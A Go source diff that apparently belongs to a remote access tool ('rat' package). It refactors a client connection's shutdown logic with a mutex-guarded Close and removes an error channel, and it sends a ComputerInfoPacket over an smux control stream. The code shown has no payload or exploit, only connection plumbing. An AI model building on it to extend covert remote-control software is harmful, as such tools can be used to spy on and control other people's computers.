@@ -3,8 +3,10 @@ package main
 import (
 	"encoding/binary"
 	"errors"
+	"fmt"
 	"rat/shared"
 	"rat/shared/network/header"
+	"sync"
 
 	"github.com/xtaci/smux"
 )
@@ -14,8 +16,8 @@ type Connection struct {
 	control *smux.Stream
 
 	packets chan Outgoing
-	err     chan error
 	die     chan struct{}
+	dieLock sync.Mutex
 }
 
 func NewConnection(Conn *smux.Session) (*Connection, error) {
@@ -29,7 +31,6 @@ func NewConnection(Conn *smux.Session) (*Connection, error) {
 	c.Conn = Conn
 	c.control = control
 	c.packets = make(chan Outgoing)
-	c.err = make(chan error, 1)
 	c.die = make(chan struct{})
 
 	return c, nil
@@ -39,17 +40,25 @@ func (c *Connection) Init() {
 	c.packets <- &ComputerInfoPacket{}
 }
 
-func (c *Connection) Close() {
-	close(c.die)
-	close(c.err)
-	close(c.packets)
-	c.Conn.Close()
+func (c *Connection) Close(err error) {
+	c.dieLock.Lock()
+	defer c.dieLock.Unlock()
+
+	select {
+	case <-c.die:
+	default:
+		close(c.die)
+		c.Conn.Close()
+		fmt.Println("lost connection", err)
+	}
 }
 
 func (c *Connection) writeLoop() {
 	var err error
-	for {
+	for err == nil {
 		select {
+		case <-c.die:
+			return
 		case p := <-c.packets:
 			err = binary.Write(c.control, shared.ByteOrder, p.Header())
 			if err != nil {
@@ -60,14 +69,10 @@ func (c *Connection) writeLoop() {
 			if err != nil {
 				break
 			}
-		case <-c.die:
-			return
 		}
 	}
 
-	if err != nil {
-		c.err <- err
-	}
+	c.Close(err)
 }
 
 func (c *Connection) recvLoop() {
@@ -96,7 +101,7 @@ func (c *Connection) recvLoop() {
 				case <-c.die:
 				default:
 					if err != nil {
-						c.err <- err
+						c.Close(err)
 					}
 				}
 			}()
@@ -118,8 +123,6 @@ func (c *Connection) recvLoop() {
 	select {
 	case <-c.die:
 	default:
-		if err != nil {
-			c.err <- err
-		}
+		c.Close(err)
 	}
 }
